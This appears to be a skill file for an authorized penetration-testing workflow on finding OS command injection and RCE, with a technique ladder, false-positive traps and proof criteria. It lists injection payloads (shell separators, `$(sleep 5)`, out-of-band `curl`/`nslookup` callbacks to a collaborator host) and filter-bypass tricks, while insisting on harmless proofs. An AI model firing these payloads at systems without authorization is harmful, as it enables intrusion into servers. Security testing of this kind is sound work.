---
name: command-injection
description: Test inputs reaching OS commands for command injection / RCE — blind and in-band.
category: injection
triggers: ["command injection", "rce", "os command", "shell", "exec", "code execution"]
status: active
---

# Command Injection / RCE

Input flowing into an OS command (ping/DNS tools, file converters, PDF/image
pipelines, git/archive ops, admin utilities). Highest-impact class — so prove it
**safely**: a harmless delay or OOB callback, **never** a destructive command,
reverse shell, or file deletion on a live target.

## Attack model
- **Asset:** the server itself — full RCE.
- **Authority decision:** should this input become part of a shell command? Never.
- **Attacker input:** params feeding tools that shell out — hostnames, filenames, URLs, options, format strings.
- **Smallest safe proof:** a controlled time delay you set, OR an OOB DNS/HTTP callback with a unique marker. No output exfiltration beyond proving execution.

## Technique ladder (safe)
1. **Separators:** `;`, `|`, `&`, `&&`, `||`, newline, backticks `` ` ``, `$(...)`, `%0a`.
   Probe: `127.0.0.1; <cmd>`, `127.0.0.1 | <cmd>`, `$(<cmd>)`.
2. **Blind time-based (preferred):** `; sleep 5`, `| sleep 5`, `$(sleep 5)`; Windows `& timeout 5` / `ping -n 5 127.0.0.1`. Confirm with 2-3 samples vs baseline (timing needs a clean baseline).
3. **OOB (preferred when no output):** `; nslookup <marker>.<collab>` / `; curl http://<marker>.<collab>/` — use ONLY the user-provided Collaborator (see `blind-vuln`). Unique marker per test.
4. **In-band:** only a harmless command whose output appears (`id`, `whoami`, `hostname`) to confirm — one command, no further enumeration on a live target.

## Context variants
- Argument injection (no separator needed): sneaking an extra flag into a tool (`--output`, `-o`, `--upload-file`) — often missed, often safer to trigger.
- Quote context: break out of `'...'` / `"..."` wrapping the input.
- Filter bypass: `$IFS` for spaces, concatenation, globbing, encoding, env-var tricks.

## Chain targets
RCE is terminal — but even a confirmed blind callback proves it. Argument injection →
file write/read → escalation. SSTI and deserialization are sibling RCE classes (see `ssti`).

## FP traps
- **Timing noise** — jitter mimics a delay; require multiple samples + baseline, use a clear delay (5s).
- Collaborator hit from your own machine/scanner ≠ proof — target egress only.
- A reflected error containing a path ≠ injection.
- "It errored" ≠ it executed — need the delay/callback.

## Promotion / proof
- CONFIRMED: controlled delay reproduced 2x, OR OOB callback with your marker from the target, raw request saved. Stop at proof — do not run further commands.
- Severity: confirmed RCE = P1 (Critical). Blind-DNS-only command exec still P1 when the callback is the target's and reproducible.

## References
`ssti`, `blind-vuln`, `waf-bypass`, `file-upload` (converter backends),
`exploit-chain-analysis`; memory first. Review program rules before any OS-command proof.
